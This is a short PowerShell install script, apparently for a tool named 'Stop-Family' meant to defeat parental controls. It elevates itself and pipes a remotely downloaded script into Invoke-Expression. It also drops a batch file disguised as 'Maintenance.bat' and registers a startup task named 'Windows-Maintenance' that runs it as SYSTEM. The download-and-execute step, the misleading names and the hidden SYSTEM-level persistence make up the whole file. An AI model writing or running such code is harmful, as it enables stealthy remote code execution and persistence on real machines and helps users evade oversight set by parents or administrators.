if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))  
{
  Start-Process powershell -Verb runAs -Command "Invoke-WebRequest -Uri `"https://raw.githubusercontent.com/TheBotlyNoob/Misc-Projects/main/Stop-Family/install.ps1`" | IEX"
  Break
}

# Download File
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/TheBotlyNoob/Misc-Projects/main/Stop-Family/Stop-Family.bat" -OutFile "$env:AppData\Maintenance.bat"

# Set The Task To Run On Start
schtasks /create /sc 'ONSTART' /tn 'Windows-Maintenance' /tr `"$env:AppData\Maintenance.bat`" /ru 'system' /f
